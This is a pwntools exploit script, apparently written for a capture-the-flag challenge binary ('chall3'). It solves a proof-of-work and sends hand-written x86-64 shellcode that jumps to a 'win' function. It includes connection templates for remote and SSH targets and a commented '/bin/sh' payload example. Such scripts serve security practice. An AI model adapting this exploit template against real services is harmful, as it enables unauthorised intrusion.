import argparse
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

# cmdline argument - how to connect to binary
parser = argparse.ArgumentParser()
parser.add_argument("--local", help="Run exploit locally", action="store_true")
parser.add_argument("--attach", help="Run exploit locally and attach debugger", action="store_true")
parser.add_argument("--remote", help="Run exploit on remote service", action="store_true")
parser.add_argument("--ssh", help="Run exploit on SSH server", action="store_true")
args = parser.parse_args()

# GDB commands
debugging = False
gdb_cmd = [
	"b *0x555555554ecf",
	"c"
]

# Binary names
bin_fname = './chall3'
libc_fname = ''

# Remote
IP = ''
PORT = 0

# SSH
URL = ''
username = ''
password = ''
bin_abs_path = ''

# Create ELF objects
e = ELF(bin_fname)
libc = ELF(libc_fname) if libc_fname else None
x64 = e.bits != 32

# Command line args
# e.g. arg1 = cyclic_find('ahaa') * 'a' + '\xbd\x86\x04\x08' + 'a' * 4 + p32(next(e.search('/bin/sh')))
arg1 = ''
proc_args = [bin_fname, arg1]

if args.remote:
	p = remote(IP, PORT)
elif args.local or args.attach:
	p = process(proc_args)
	if args.attach:
		gdb.attach(p, gdbscript="\n".join(gdb_cmd))
elif args.ssh:
	s = ssh(host=URL, user=username, password=password)
	s.set_working_directory(bin_abs_path)
	p = s.process(proc_args)
else:
	p = gdb.debug(proc_args, gdbscript="\n".join(gdb_cmd))
	debugging = True

"""
	Exploit

	Examples:
	func_offset = libc.symbols['puts'] 	# Offset in libc
	puts_addr = p32(e.got['puts'])
	main = e.symbols['main']
	addr_string = next(e.search('/bin/cat flag.txt'))
"""

# Send proof of work
proof_line = p.recvline().strip()
sum_val = int(proof_line.split(' ')[-1], 16)
p.recvuntil('> ')
p.sendline(str(sum_val) + ' ' +  str(0))

# Send shellcode
p.recvuntil('Input: ')

buf = '\x00' # bypass xor against rand
buf += '\x58\x58\x58\x58\x58\x58\x58\x48\xC1\xE8\x0C\x48\xC1\xE0\x0C\x48\x05\xA6\x0B\x00\x00\xFF\xE0'

"""
0:  58                      pop    rax
1:  58                      pop    rax
2:  58                      pop    rax
3:  58                      pop    rax
4:  58                      pop    rax
5:  48 c1 e8 0c             shr    rax,0xc # Clear out the lower 12 bits
9:  48 c1 e0 0c             shl    rax,0xc
d:  48 05 a6 0b 00 00       add    rax,0xba6 # Add the offset of win func
13: ff e0                   jmp    rax
"""
p.sendline(buf)
p.interactive()
